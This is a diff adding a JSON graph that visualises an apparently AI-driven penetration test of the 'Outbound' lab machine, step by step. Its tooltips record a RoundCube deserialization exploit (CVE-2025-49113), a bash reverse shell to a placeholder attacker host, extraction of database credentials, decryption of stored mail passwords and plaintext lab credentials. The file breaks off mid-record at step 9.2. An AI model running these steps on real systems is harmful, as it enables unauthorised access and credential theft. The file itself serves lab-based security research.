@@ -1,0 +1,2236 @@
+{
+  "paper_analogy": "Deep Reinforcement Learning on Graphs for Autonomous Search-and-Track",
+  "machine": "Outbound",
+  "source": "training_data.csv, Machine == 'Outbound', 13 row(s), 1 auto-detected run(s)/playthroughs. Graph built directly from the PTT (Penetration Testing Tree) field's growth.",
+  "analogy_mapping": {
+    "Agent Nodes": "PTT snapshot reached after each new tree item (state = cumulative tree)",
+    "Search Nodes": "The PTT tree item worked on (number + title) + its MCP_tasks tool calls",
+    "Track Nodes": "That item's findings payload -- what was actually discovered"
+  },
+  "legend": {
+    "node_types": {
+      "Agent (Blue/Pink goal)": "PTT state after a new item completes",
+      "Search (Orange)": "PTT item being worked (tool calls in tooltip)",
+      "Track (Green)": "Findings payload of that item"
+    },
+    "edge_types": {
+      "StateTransition (Black)": "Agent -> Agent, label = PTT item number",
+      "SearchUpdate (Green)": "Agent -> Search, item being worked from that state",
+      "TrackUpdate (Blue)": "Search -> Track, what item's execution found",
+      "Prediction (Purple)": "Track -> Agent, leads to next cumulative PTT state"
+    }
+  },
+  "nodes": [
+    {
+      "id": "agent:Outbound:START",
+      "label": "Agent: Initial\n(Start)",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Start of pentest against 'Outbound'. 1 recorded run(s) below.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s1_2",
+      "label": "Search: 2\nWeb application analysis",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 2: Web application analysis\n\nMCP tool calls:\nNmap: Perform comprehensive port scan with service version detection and OS fingerprinting on target 10.10.11.77",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s1_2",
+      "label": "Track: Web application analysis",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "2 Web application analysis:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s1_2",
+      "label": "Agent: 2\nWeb application analy\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 2:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network scanning\n  \u2713 1.2 Service enumeration\n\u25cb 2 Web application analysis\n  \u25cb 2.1 Service identification",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s1_2.1",
+      "label": "Search: 2.1\nService identification",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 2.1: Service identification\n\nMCP tool calls:\nNmap: Perform comprehensive port scan with service version detection and OS fingerprinting on target 10.10.11.77",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s1_2.1",
+      "label": "Track: Service identification",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "2.1 Service identification:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s1_2.1",
+      "label": "Agent: 2.1\nWeb application analy\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 2.1:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network scanning\n  \u2713 1.2 Service enumeration\n\u25cb 2 Web application analysis\n  \u25cb 2.1 Service identification",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s2_2.2",
+      "label": "Search: 2.2\nAuthentication testing",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 2.2: Authentication testing\n\nMCP tool calls:\nWeb page interaction: Browse mail.outbound.htb to identify application. Check page source for version identifiers. Test authentication with tyler:LhKL1o9Nm3X2. Document application name and version.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s2_2.2",
+      "label": "Track: Authentication testing",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "2.2 Authentication testing:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s2_2.2",
+      "label": "Agent: 2.2\nWeb application analy\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 2.2:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n  \u2713 2.1 Service identification\n  \u2713 2.2 Authentication testing\n\u25cb 3 Vulnerability research\n  \u25cb 3.1 CVE identification",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s2_3",
+      "label": "Search: 3\nVulnerability research",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 3: Vulnerability research\n\nMCP tool calls:\nWeb page interaction: Browse mail.outbound.htb to identify application. Check page source for version identifiers. Test authentication with tyler:LhKL1o9Nm3X2. Document application name and version.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s2_3",
+      "label": "Track: Vulnerability research",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "3 Vulnerability research:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s2_3",
+      "label": "Agent: 3\nVulnerability research",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 3:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n  \u2713 2.1 Service identification\n  \u2713 2.2 Authentication testing\n\u25cb 3 Vulnerability research\n  \u25cb 3.1 CVE identification",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s2_3.1",
+      "label": "Search: 3.1\nCVE identification",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 3.1: CVE identification\n\nMCP tool calls:\nWeb page interaction: Browse mail.outbound.htb to identify application. Check page source for version identifiers. Test authentication with tyler:LhKL1o9Nm3X2. Document application name and version.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s2_3.1",
+      "label": "Track: CVE identification",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "3.1 CVE identification:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s2_3.1",
+      "label": "Agent: 3.1\nVulnerability research",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 3.1:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n  \u2713 2.1 Service identification\n  \u2713 2.2 Authentication testing\n\u25cb 3 Vulnerability research\n  \u25cb 3.1 CVE identification",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s3_4",
+      "label": "Search: 4\nInitial exploitation",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 4: Initial exploitation\n\nMCP tool calls:\nGoogle search: Search for 'RoundCube 1.6.10 CVE vulnerability remote code execution authenticated deserialization'. Research security advisories and exploit databases for this version.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s3_4",
+      "label": "Track: Initial exploitation",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "4 Initial exploitation:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s3_4",
+      "label": "Agent: 4\nInitial exploitation",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 4:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n  \u2713 3.1 CVE identification\n\u25cb 4 Initial exploitation\n  \u25cb 4.1 Deserialization RCE",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s3_4.1",
+      "label": "Search: 4.1\nDeserialization RCE",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 4.1: Deserialization RCE\n\nMCP tool calls:\nGoogle search: Search for 'RoundCube 1.6.10 CVE vulnerability remote code execution authenticated deserialization'. Research security advisories and exploit databases for this version.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s3_4.1",
+      "label": "Track: Deserialization RCE",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "4.1 Deserialization RCE:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s3_4.1",
+      "label": "Agent: 4.1\nInitial exploitation",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 4.1:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n  \u2713 3.1 CVE identification\n\u25cb 4 Initial exploitation\n  \u25cb 4.1 Deserialization RCE",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s4_4.2",
+      "label": "Search: 4.2\nShell establishment",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 4.2: Shell establishment\n\nMCP tool calls:\nInteractive CLI: Obtain CVE-2025-49113 exploit script. Execute with tyler credentials targeting mail.outbound.htb. Generate serialized payload using Crypt_GPG_Engine gadget chain. Test execution with sleep command to confirm blind RCE.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s4_4.2",
+      "label": "Track: Shell establishment",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "4.2 Shell establishment:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s4_4.2",
+      "label": "Agent: 4.2\nInitial exploitation",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 4.2:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n  \u2713 4.1 Deserialization RCE\n  \u25cb 4.2 Shell establishment",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s5_5",
+      "label": "Search: 5\nLateral movement",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 5: Lateral movement\n\nMCP tool calls:\nInteractive CLI: Execute bash reverse shell payload via CVE-2025-49113: bash -c 'bash -i >& /dev/tcp/[attacker-ip]/443 0>&1'. Netcat: Establish listener on port 443 to receive connection as www-data user.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s5_5",
+      "label": "Track: Lateral movement",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "5 Lateral movement:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s5_5",
+      "label": "Agent: 5\nLateral movement",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 5:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n  \u2713 4.1 Deserialization RCE\n  \u2713 4.2 Shell establishment\n\u25cb 5 Lateral movement\n  \u25cb 5.1 Database enumeration",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s5_5.1",
+      "label": "Search: 5.1\nDatabase enumeration",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 5.1: Database enumeration\n\nMCP tool calls:\nInteractive CLI: Execute bash reverse shell payload via CVE-2025-49113: bash -c 'bash -i >& /dev/tcp/[attacker-ip]/443 0>&1'. Netcat: Establish listener on port 443 to receive connection as www-data user.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s5_5.1",
+      "label": "Track: Database enumeration",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "5.1 Database enumeration:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s5_5.1",
+      "label": "Agent: 5.1\nLateral movement",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 5.1:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n  \u2713 4.1 Deserialization RCE\n  \u2713 4.2 Shell establishment\n\u25cb 5 Lateral movement\n  \u25cb 5.1 Database enumeration",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s6_5.2",
+      "label": "Search: 5.2\nPassword extraction",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 5.2: Password extraction\n\nMCP tool calls:\nInteractive CLI: Locate RoundCube config at /var/www/html/roundcube/config/config.inc.php. Extract database credentials. Connect to MySQL using credentials. Query session table for encrypted IMAP passwords.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s6_5.2",
+      "label": "Track: Password extraction",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "5.2 Password extraction:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s6_5.2",
+      "label": "Agent: 5.2\nLateral movement",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 5.2:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n  \u2713 5.1 Database enumeration\n  \u2713 5.2 Password extraction\n\u25cb 6 Password decryption\n  \u25cb 6.1 Credential recovery",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s6_6",
+      "label": "Search: 6\nPassword decryption",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 6: Password decryption\n\nMCP tool calls:\nInteractive CLI: Locate RoundCube config at /var/www/html/roundcube/config/config.inc.php. Extract database credentials. Connect to MySQL using credentials. Query session table for encrypted IMAP passwords.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s6_6",
+      "label": "Track: Password decryption",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "6 Password decryption:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s6_6",
+      "label": "Agent: 6\nPassword decryption",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 6:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n  \u2713 5.1 Database enumeration\n  \u2713 5.2 Password extraction\n\u25cb 6 Password decryption\n  \u25cb 6.1 Credential recovery",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s6_6.1",
+      "label": "Search: 6.1\nCredential recovery",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 6.1: Credential recovery\n\nMCP tool calls:\nInteractive CLI: Locate RoundCube config at /var/www/html/roundcube/config/config.inc.php. Extract database credentials. Connect to MySQL using credentials. Query session table for encrypted IMAP passwords.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s6_6.1",
+      "label": "Track: Credential recovery",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "6.1 Credential recovery:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s6_6.1",
+      "label": "Agent: 6.1\nPassword decryption",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 6.1:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n  \u2713 5.1 Database enumeration\n  \u2713 5.2 Password extraction\n\u25cb 6 Password decryption\n  \u25cb 6.1 Credential recovery",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s7_7",
+      "label": "Search: 7\nMail access",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 7: Mail access\n\nMCP tool calls:\nInteractive CLI: Use /var/www/html/roundcube/bin/decrypt.sh to decrypt passwords. Decrypt Tyler's password hcVCSNXOYgUXvhArn1a1OHJtDck+CFME. Decrypt Jacob's password L7Rv00A8TuwJAr67kITxxcSgnIk25Am/. Document decrypted credentials.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s7_7",
+      "label": "Track: Mail access",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "7 Mail access:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s7_7",
+      "label": "Agent: 7\nMail access",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 7:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n\u2713 6 Password decryption\n  \u2713 6.1 Credential recovery\n\u25cb 7 Mail access\n  \u25cb 7.1 Email enumeration",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s7_7.1",
+      "label": "Search: 7.1\nEmail enumeration",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 7.1: Email enumeration\n\nMCP tool calls:\nInteractive CLI: Use /var/www/html/roundcube/bin/decrypt.sh to decrypt passwords. Decrypt Tyler's password hcVCSNXOYgUXvhArn1a1OHJtDck+CFME. Decrypt Jacob's password L7Rv00A8TuwJAr67kITxxcSgnIk25Am/. Document decrypted credentials.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s7_7.1",
+      "label": "Track: Email enumeration",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "7.1 Email enumeration:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s7_7.1",
+      "label": "Agent: 7.1\nMail access",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 7.1:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n\u2713 6 Password decryption\n  \u2713 6.1 Credential recovery\n\u25cb 7 Mail access\n  \u25cb 7.1 Email enumeration",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s8_8",
+      "label": "Search: 8\nSSH access",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 8: SSH access\n\nMCP tool calls:\nWeb page interaction: Login to RoundCube at mail.outbound.htb with credentials jacob:595mO8DmwGeD. Browse inbox and folders. Document email contents including senders, subjects, and any credentials or sensitive information.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s8_8",
+      "label": "Track: SSH access",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "8 SSH access:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s8_8",
+      "label": "Agent: 8\nSSH access",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 8:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n\u2713 6 Password decryption\n\u2713 7 Mail access\n  \u2713 7.1 Email enumeration\n\u25cb 8 SSH access\n  \u25cb 8.1 Host authentication",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s8_8.1",
+      "label": "Search: 8.1\nHost authentication",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 8.1: Host authentication\n\nMCP tool calls:\nWeb page interaction: Login to RoundCube at mail.outbound.htb with credentials jacob:595mO8DmwGeD. Browse inbox and folders. Document email contents including senders, subjects, and any credentials or sensitive information.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s8_8.1",
+      "label": "Track: Host authentication",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "8.1 Host authentication:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s8_8.1",
+      "label": "Agent: 8.1\nSSH access",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 8.1:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n\u2713 6 Password decryption\n\u2713 7 Mail access\n  \u2713 7.1 Email enumeration\n\u25cb 8 SSH access\n  \u25cb 8.1 Host authentication",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s9_9",
+      "label": "Search: 9\nPrivilege escalation enum\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 9: Privilege escalation enumeration\n\nMCP tool calls:\nNetcat: SSH to 10.10.11.77 port 22 using credentials jacob:gY4Wr3a1evp4. Upon successful authentication, capture user flag from Jacob's home directory.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s9_9",
+      "label": "Track: Privilege escalation enumerat\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "9 Privilege escalation enumeration:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s9_9",
+      "label": "Agent: 9\nPrivilege escalation \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 9:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n\u2713 6 Password decryption\n\u2713 7 Mail access\n\u2713 8 SSH access\n  \u2713 8.1 Host authentication\n\u25cb 9 Privilege escalation enumeration\n  \u25cb 9.1 Sudo privileges check",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s9_9.1",
+      "label": "Search: 9.1\nSudo privileges check",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 9.1: Sudo privileges check\n\nMCP tool calls:\nNetcat: SSH to 10.10.11.77 port 22 using credentials jacob:gY4Wr3a1evp4. Upon successful authentication, capture user flag from Jacob's home directory.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s9_9.1",
+      "label": "Track: Sudo privileges check",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "9.1 Sudo privileges check:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s9_9.1",
+      "label": "Agent: 9.1\nPrivilege escalation \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 9.1:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n\u2713 6 Password decryption\n\u2713 7 Mail access\n\u2713 8 SSH access\n  \u2713 8.1 Host authentication\n\u25cb 9 Privilege escalation enumeration\n  \u25cb 9.1 Sudo privileges check",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s10_9.2",
+      "label": "Search: 9.2\nApplication analysis",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 9.2: Application analysis\n\nMCP tool calls:\nInteractive CLI: Execute sudo -l to check Jacob's sudo privileges. Document allowed commands and restrictions. Examine /opt for custom applications. Check file permissions on any discovered binaries.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s10_9.2",
+      "label": "Track: Application analysis",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "9.2 Application analysis:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s10_9.2",
+      "label": "Agent: 9.2\nPrivilege escalation \u2026",
+      "type": "Agent",
